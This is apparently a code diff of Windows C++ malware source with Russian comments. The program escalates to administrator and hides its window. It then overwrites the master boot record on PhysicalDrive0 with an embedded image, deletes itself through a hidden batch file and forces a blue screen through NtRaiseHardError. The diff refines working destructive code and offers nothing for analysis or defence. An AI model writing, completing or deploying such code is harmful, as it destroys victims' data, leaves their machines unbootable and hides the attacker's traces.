@@ -2,41 +2,48 @@
 #include <string>
 #include <vector>
 #include <fstream>
+#include <shlwapi.h>
+
+#pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "advapi32.lib")
 
 const char MBR_HEX[] = "{MBR_DATA}";
 
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "ntdll.lib")
-
-typedef NTSTATUS (NTAPI *pNtRaiseHardError)(
-    NTSTATUS ErrorStatus,
-    ULONG NumberOfParameters,
-    ULONG UnicodeStringParameterMask,
-    PULONG_PTR Parameters,
-    HARDERROR_RESPONSE_OPTION ResponseOption,
-    PHARDERROR_RESPONSE Response
-);
-
+// === ВЫЗОВ BSOD (упрощённый, без сложных типов) ===
 void TriggerBSOD() {
+    // Получаем ntdll.dll
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) return;
     
-    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
+    // NtRaiseHardError через GetProcAddress
+    typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
+        NTSTATUS ErrorStatus,
+        ULONG NumberOfParameters,
+        ULONG UnicodeStringParameterMask,
+        PULONG_PTR Parameters,
+        ULONG ResponseOption,
+        PULONG Response
+    );
+    
+    NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
     if (!NtRaiseHardError) return;
     
+    // Параметры для BSOD
     ULONG_PTR params[4] = {0};
-    HARDERROR_RESPONSE response;
+    ULONG response = 0;
     
+    // Вызываем синий экран с кодом CRITICAL_PROCESS_DIED
     NtRaiseHardError(
-        0xC000021A,
-        1,
-        0,
-        (PULONG_PTR)&params,
-        OptionShutdownSystem,
+        0xC000021A,  // STATUS_SYSTEM_PROCESS_TERMINATED
+        1,           // 1 параметр
+        0,           // Нет строковых параметров
+        params,      // Параметры
+        6,           // OptionShutdownSystem
         &response
     );
 }
 
+// === ПОВЫШЕНИЕ ПРАВ ===
 void ElevateAndRun() {
     SHELLEXECUTEINFOA sei = {0};
     sei.cbSize = sizeof(sei);
@@ -49,6 +56,7 @@ void ElevateAndRun() {
     }
 }
 
+// === КОНВЕРТЕР HEX ===
 std::vector<unsigned char> HexToBytes(const std::string& hex) {
     std::vector<unsigned char> bytes;
     for (size_t i = 0; i < hex.length(); i += 2) {
@@ -59,12 +67,14 @@ std::vector<unsigned char> HexToBytes(const std::string& hex) {
     return bytes;
 }
 
+// === ЗАПИСЬ MBR (СКРЫТО) ===
 void WriteMBR() {
     std::string hex(MBR_HEX);
     std::vector<unsigned char> image = HexToBytes(hex);
     
     if (image.size() < 512) return;
     
+    // Отключаем проверки целостности Windows
     HANDLE hToken;
     TOKEN_PRIVILEGES tkp;
     OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
@@ -77,6 +87,7 @@ void WriteMBR() {
     tkp.Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
     AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
     
+    // Открываем диск
     HANDLE hDisk = CreateFileA(
         "\\\\.\\PhysicalDrive0",
         GENERIC_WRITE,
@@ -100,42 +111,49 @@ void WriteMBR() {
         if (hDisk == INVALID_HANDLE_VALUE) return;
     }
     
+    // Записываем образ (MBR + Stage2)
     DWORD bytesWritten;
     WriteFile(hDisk, image.data(), (DWORD)image.size(), &bytesWritten, NULL);
     CloseHandle(hDisk);
     
-    wchar_t szPath[MAX_PATH] = {0};
-    GetModuleFileNameW(NULL, szPath, MAX_PATH);
+    // Самоуничтожение
+    char szPath[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, szPath, MAX_PATH);
     
-    std::wstring batPath = std::wstring(szPath) + L".bat";
-    std::ofstream bat(batPath);
+    // Создаём bat-файл для удаления (используем char, а не wchar_t)
+    std::string batPath = std::string(szPath) + ".bat";
+    std::ofstream bat(batPath.c_str());
     bat << "@echo off\n";
     bat << "timeout /t 1 /nobreak > nul\n";
     bat << "del \"" << szPath << "\"\n";
     bat << "del \"" << batPath << "\"\n";
     bat.close();
     
-    STARTUPINFOW si = {0};
+    // Запускаем bat скрыто
+    STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
     
-    CreateProcessW(NULL, (LPWSTR)batPath.c_str(), NULL, NULL, FALSE,
+    CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE,
         CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     
-    HRSRC hRes = FindResourceA(NULL, "BSOD", "SETTING");
-    if (hRes) {
+    // BSOD
+    if (FindResourceA(NULL, "BSOD", "SETTING")) {
         TriggerBSOD();
     }
 }
 
+// === ТОЧКА ВХОДА ===
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
+    // Если не админ — запрашиваем права
     if (!IsUserAnAdmin()) {
         ElevateAndRun();
         return 0;
     }
     
+    // Скрываем окно консоли
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     
     WriteMBR();
